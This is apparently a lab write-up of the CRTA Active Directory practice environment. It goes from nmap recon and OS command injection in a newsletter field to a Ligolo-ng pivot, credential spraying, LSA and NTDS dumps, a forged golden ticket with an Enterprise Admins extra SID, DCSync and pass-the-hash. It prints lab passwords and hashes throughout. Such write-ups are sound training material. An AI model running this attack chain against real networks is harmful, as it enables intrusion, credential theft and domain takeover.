---
title: "CWL - CRTA Lab Writeup"
date: 2026-08-04 16:00:00 +0200
categories: [WriteUp]
tags: [WriteUp, Active Directory, CRTA]
image: /assets/images/CRTA_Lab/CRTA_logo.png
---

Complete writeup of the Certified Red Team Analyst (CRTA) practice lab provided by Cyber WareFare Labs, from web foothold to full Active Directory forest compromise.

---

## 1. Scope

| Network            | Range              |
|---------------------|--------------------|
| VPN IP Range         | 10.10.200.0/24     |
| External IP Range    | 192.168.80.0/24    |
| Internal IP Range    | 192.168.98.0/24    |

Connection to the lab is established via the provided OpenVPN profile:

```bash
sudo openvpn <file_name>.ovpn
```

---

## 2. External Reconnaissance

A host discovery scan against the external range revealed a single live host:

```bash
nmap -sn 192.168.80.0/24
```

```
Nmap scan report for 192.168.80.10
Host is up (0.078s latency).
```

A full service/version scan against `192.168.80.10` was then run:

```bash
nmap -sV -sC -O -T4 192.168.80.10 -oN nmapResults_External.txt
```

```
Nmap scan report for 192.168.80.10
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8d:c3:a7:a5:bf:16:51:f2:03:85:a7:37:ee:ae:8d:81 (RSA)
|   256 9a:b2:73:5a:e5:36:b4:91:d8:8c:f7:4a:d0:15:65:28 (ECDSA)
|_  256 3c:16:a7:6a:b6:33:c5:83:ab:7f:99:60:6a:4c:09:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Cyber WareFare Labs
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two services are exposed: 

SSH on port 22 and an Apache web server on port 80. This narrows the initial attack surface to the web application.

---

## 3. Web Application Exploitation

### 3.1 Initial access to the app

Browsing to the host presented a login form for an e-commerce site named **Cyberwarops**. Common default credentials (`root:root`, `admin:admin`) failed, and brute-forcing was set aside in favor of simply registering an account to explore the application as an authenticated user.

Once logged in, the site turned out to be an unfinished e-commerce platform that repeatedly prompted the user to subscribe to a newsletter.

### 3.2 Command injection via the newsletter feature

Intercepting the newsletter subscription request with Burp Suite showed that the submitted email address is passed directly in the POST body:

![image](/assets/images/CRTA_Lab/Newsletter_post_request.png)

Testing OS command injection in the `EMAIL` parameter succeeded immediately:

![image](/assets/images/CRTA_Lab/ls.png)

The response reflected a full directory listing of the web root confirming the OS command injection in the newsletter handler.

### 3.3 Reading sensitive files

Leveraging the same injection point to read `/etc/passwd`:

![image](/assets/images/CRTA_Lab/Passwd.png)

The response leaked the contents of /etc/passwd. While this file doesn't normally contain passwords, one entry was misconfigured with a plaintext password in the GECOS field


---

## 4. Initial Foothold via SSH

The leaked credential was tested directly against SSH:

```bash
ssh privilege@192.168.80.10
```

Login succeeded (`privilege:Admin@962`).

### 4.1 Local privilege escalation

Basic enumeration (`id`, `sudo -l`) showed that `privilege` can run **any** command as root via `sudo`:

```bash
sudo su
```

This immediately yielded a root shell (`uid=0(root) gid=0(root) groups=0(root)`).

---

## 5. Post-Exploitation 
### Credential Harvesting from Firefox

While enumerating the `privilege` home directory, a `.sqlite_history` file revealed prior interactive queries against `moz_bookmarks`, hinting that a Firefox profile database had already been (or should be) mined for information:

![image](/assets/images/CRTA_Lab/sql_history.png)



Querying the bookmarks table directly exposed a bookmarked internal admin URL containing plaintext credentials:

![image](/assets/images/CRTA_Lab/moz_bookmarks.png)


This single row provided three critical pieces of intelligence:

- A new, previously unseen internal IP: `192.168.98.30`
- Clear-text credentials: `john:User1@#$%6`
- The suffix `@child.warfare.corp`, strongly suggesting the internal network is an **Active Directory** environment, specifically a child domain

Running `ifconfig` on the compromised host confirmed a second network interface (`ens34`, `192.168.98.15/24`) that is not reachable directly from the attacker machine, this is the pivot point into the internal AD network.

---

## 6. Network Pivoting with Ligolo-ng

To reach the internal `192.168.98.0/24` network, a Ligolo-ng tunnel was established through the compromised Ubuntu host.

### 6.1 Transfer the agent and start the proxy

```bash
# On the attacker machine
scp agent privilege@192.168.80.10:/home/privilege
sudo ./proxy -selfcert   # make sure Burp isn't also bound to 8080 if using Ligolo's WebUI
```

### 6.2 Run the agent on the target

```bash
# On the target machine 
chmod +x agent
./agent -connect $AttackerIP$:11601 -ignore-cert
```

### 6.3 Bind the session and configure routing

On the attacker machine side, the incoming agent session was selected via `session`, and the built-in interactive `autoroute` command was used to add a route to the internal subnet:

```bash
[Agent : root@ubuntu-virtual-machine] » autoroute
? Select routes to add:
> [x] 192.168.98.15/24
  [ ] 192.168.80.10/24
```

A new tunneling interface was created and the tunnel started.

### 6.4 Validate connectivity

```bash
ping -c5 192.168.98.15
```

```
64 bytes from 192.168.98.15: icmp_seq=1 ttl=64 time=119 ms
...
```

The internal network was now reachable through the pivot.

---

## 7. Internal Network Discovery

Host discovery (using `--unprivileged` to avoid false positives caused by the tunnel):

```bash
nmap --unprivileged -sn 192.168.98.0/24
```

```
Nmap scan report for warfare.corp (192.168.98.2)
Nmap scan report for 192.168.98.15
Nmap scan report for 192.168.98.30
Nmap scan report for child.warfare.corp (192.168.98.120)
```

Four hosts are up, including the already-compromised pivot (`192.168.98.15`).

### 7.1 Service enumeration per host

**192.168.98.2 - `DC01` (warfare.corp)**

```bash
nmap -sV -sC -O -T4 192.168.98.2 -oN NmapResults_Internal02.txt
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 16:08 CEST
Nmap scan report for warfare.corp (192.168.98.2)
Host is up (0.065s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-04 14:09:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: warfare.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: warfare.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
OS fingerprint not ideal because: Host distance (-10 network hops) appears to be negative
No OS matches for host
Network Distance: -10 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:96:1e:98 (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-04T14:09:10
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.96 seconds

```
Identified as the **forest root domain controller** for `warfare.corp`.

**192.168.98.30 - `MGMT`**

```bash
nmap -sV -sC -O -T4 192.168.98.30 -oN NmapResults_Internal30.txt
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 16:09 CEST
Nmap scan report for 192.168.98.30
Host is up (0.053s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/4%OT=135%CT=1%CU=40035%PV=Y%DS=1%DC=I%G=Y%TM=6A71F2A
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=RD%II=RI%TS=A)S
OS:EQ(SP=106%GCD=1%ISR=10A%TI=I%CI=RD%II=RI%TS=A)SEQ(SP=FB%GCD=1%ISR=10E%TI
OS:=I%CI=RD%II=RI%TS=A)SEQ(SP=FD%GCD=1%ISR=10E%TI=I%CI=RD%II=RI%TS=A)SEQ(SP
OS:=FF%GCD=1%ISR=10E%TI=I%CI=RD%II=RI%TS=A)OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11
OS:NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)WIN(W1=
OS:7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)ECN(R=Y%DF=N%TG=40%W=7200%O
OS:=M5B4NW7%CC=N%Q=)ECN(R=Y%DF=N%T=40%W=7200%O=M5B4NW7%CC=N%Q=)T1(R=Y%DF=N%
OS:TG=40%S=O%A=S+%F=AS%RD=0%Q=)T1(R=Y%DF=N%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T2(R=Y%DF=N%T=40%W=0%S=Z%A=S%F=
OS:AR%O=%RD=0%Q=)T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0
OS:%Q=)T3(R=Y%DF=N%T=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)T4(R=Y%
OS:DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=N%T=40%W=0%S=A%A=Z%F=R%O
OS:=%RD=0%Q=)T5(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T5(R=Y%DF=N%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T6(R=Y%DF=N%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%TG=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)T7(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%TG=40%IPL=164%UN=0%RIPL=G%RID=0%RIPCK=G%RUCK=0%RUD=G)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=0%RIPCK=G%RUCK=0%RUD=G)IE(R=Y%DFI=S%TG=40
OS:%CD=S)IE(R=Y%DFI=S%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-08-04T14:09:40
|_  start_date: N/A
|_nbstat: NetBIOS name: MGMT, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:96:f8:38 (VMware)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.15 seconds

```
No Kerberos/LDAP → a **domain-joined workstation/server**, not a DC.



**192.168.98.120 - `CDC` (child.warfare.corp)**

```bash
nmap -sV -sC -O -T4 192.168.98.120 -oN NmapResults_Internal120.txt
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-04 16:10 CEST
Nmap scan report for child.warfare.corp (192.168.98.120)
Host is up (0.097s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-04 14:10:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: warfare.corp0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: warfare.corp0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
OS fingerprint not ideal because: Host distance (-10 network hops) appears to be negative
No OS matches for host
Network Distance: -10 hops
Service Info: Host: CDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CDC, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:96:70:ab (VMware)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-04T14:11:02
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.68 seconds
```


Identified as the **domain controller of the child domain** `child.warfare.corp`.

At this point the environment was mapped as a two-tier AD forest:

```
warfare.corp (root, DC01 - 192.168.98.2)
   └── child.warfare.corp (child domain, CDC - 192.168.98.120)
            └── MGMT (192.168.98.30, domain member)
```

---

## 8. Credential Spraying and Lateral Movement

The credentials recovered from the Firefox bookmark (`john:User1@#$%6`) belong to `child.warfare.corp`. A target list of the four internal hosts was built and sprayed with NetExec:

```bash
nxc smb targets.txt -u john -p 'User1@#$%6'
```

```
SMB   192.168.98.30   MGMT   [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
SMB   192.168.98.2    DC01   [-] warfare.corp\john:User1@#$%6 STATUS_LOGON_FAILURE
SMB   192.168.98.120  CDC    [+] child.warfare.corp\john:User1@#$%6
```

`john` is a **local administrator on MGMT**, has a valid (non-admin) session on the child DC, and no access to the forest root DC.

### 8.1 Dumping LSA secrets on MGMT

Since `john` has admin rights on MGMT, the LSA secrets store was dumped:

```bash
nxc smb targets.txt -u john -p 'User1@#$%6' --lsa
```

This revealed a service-account credential stored under the `_SC_SNMPTRAP` secret (Windows services configured to run under a specific domain account store their password here in clear text):

```
SMB   192.168.98.30   MGMT   corpmngr@child.warfare.corp:User4&*&*
```

New cred: `corpmngr:User4&*&*`

### 8.2 Re-spraying with the new credential

```bash
nxc smb targets.txt -u corpmngr -p 'User4&*&*'
```

```
SMB 192.168.98.120  CDC    [+] child.warfare.corp\corpmngr:User4&*&* (Pwn3d!)
SMB 192.168.98.30   MGMT   [+] child.warfare.corp\corpmngr:User4&*&*
SMB 192.168.98.2    DC01   [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE
```

`corpmngr` is confirmed as a **Domain Admin of `child.warfare.corp`**. Full child-domain compromise achieved.

---

## 9. Cross-Domain Escalation (Child-to-Parent via Golden Ticket)

Being Domain Admin of a child domain does not grant rights in the forest root by default. To escalate from `child.warfare.corp` to `warfare.corp`, a **Golden Ticket** forged with the child domain's `krbtgt` account combined with the Enterprise Admins SID injected as an Extra SID was used to abuse SID history / cross-domain trust.

This attack requires:

1. Being Domain Admin of the child domain (already achieved)
2. The child domain `krbtgt` account's AES-256 key
3. The child domain SID
4. The parent (forest root) domain SID

### 9.1 Extracting the krbtgt key

The NTDS database of the child DC was dumped with Impacket's `secretsdump` (NetExec's `--ntds` module works equally well):

```bash
#Using impacket
impacket-secretsdump 'child.warfare.corp/corpmngr:User4&*&*@192.168.98.120'
#Using NetExec
nxc smb 192.168.98.120 -u corpmngr -p 'User4&*&*' --ntds
```

```
krbtgt-aes256-hash: ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
```

### 9.2 Retrieving both domain SIDs

Using Impacket's `lookupsid` against the RID 500 (built-in Administrator) of each domain:

```bash
impacket-lookupsid 'child.warfare.corp/corpmngr:User4&*&*@192.168.98.120' 500
# Domain SID: S-1-5-21-3754860944-83624914-1883974761   (child.warfare.corp)

impacket-lookupsid 'child.warfare.corp/corpmngr:User4&*&*@192.168.98.2' 500
# Domain SID: S-1-5-21-3375883379-808943238-3239386119   (warfare.corp)
```

### 9.3 Building the Enterprise Admins SID

The **Enterprise Admins** group exists only in the forest root domain and always carries the well-known RID **519**. Appending it to the parent domain SID gives the target extra-SID:

```
S-1-5-21-3375883379-808943238-3239386119-519
```

### 9.4 Forging the ticket

![image](/assets/images/CRTA_Lab/Forging_Ticket.png)

This produced a valid Kerberos TGT (`Administrator.ccache`) for a user that is nominally a child-domain Administrator, but carries Enterprise Admins group membership across the whole forest.

Both domain controllers were added to `/etc/hosts` to satisfy Kerberos' SPN/hostname resolution requirements:

```bash
echo "192.168.98.120 CDC.child.warfare.corp CDC" | sudo tee -a /etc/hosts
echo "192.168.98.2 DC01.warfare.corp DC01"       | sudo tee -a /etc/hosts
```

---

## 10. Forest Root Compromise with DCSync

With the forged ticket loaded, a DCSync attack was executed against the forest root DC to pull every credential in `warfare.corp`:

```bash
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass child.warfare.corp/Administrator@DC01.warfare.corp
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:437c2b6831cec5775989baf9f23255ed:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:60220568edca027258574cc029f27949:::
CHILD$:1103:aad3b435b51404eeaad3b435b51404ee:f565caad3aa402c4077f703ef837c629:::
```

---

## 11. Pass-the-Hash to the Root DC

The recovered Administrator hash was used to authenticate to `DC01` via Pass-the-Hash and obtain an interactive System shell:

```bash
impacket-psexec -hashes :a2f7b77b62cd97161e18be2ffcfdfd60 warfare.corp/Administrator@192.168.98.2
```

![image](/assets/images/CRTA_Lab/admin.png)


---

## 12. Attack Chain Summary

| # | Step | Technique |
|---|------|-----------|
| 1 | External recon | host/port discovery |
| 2 | Web foothold | OS command injection in the newsletter's `EMAIL` parameter |
| 3 | Credential theft | `/etc/passwd` leaks `privilege` account password (stored in GECOS field) |
| 4 | Local privesc | Unrestricted `sudo` on the Linux web server |
| 5 | Credential harvesting | `places.sqlite` holds AD credentials for `john` + internal IP |
| 6 | Pivoting | Ligolo-ng tunnel to internal IP |
| 7 | Internal recon | `nmap` fingerprinting |
| 8 | Lateral movement | Credential spraying (`john`), local admin on `MGMT` |
| 9 | Credential harvesting | LSA secrets dump on `MGMT` reveals a service account `corpmngr` |
| 10 | Privilege escalation | Credential spraying (`corpmngr`) confirms Domain Admin rights on `child.warfare.corp` |
| 11 | Cross-domain escalation | using `krbtgt` AES key + SIDs, forged Golden Ticket with Enterprise Admins extra-SID |
| 12 | Forest compromise | DCSync against the root DC using the forged ticket |
| 13 | Validation | Pass-the-Hash to `NT AUTHORITY\SYSTEM` on the forest root DC |

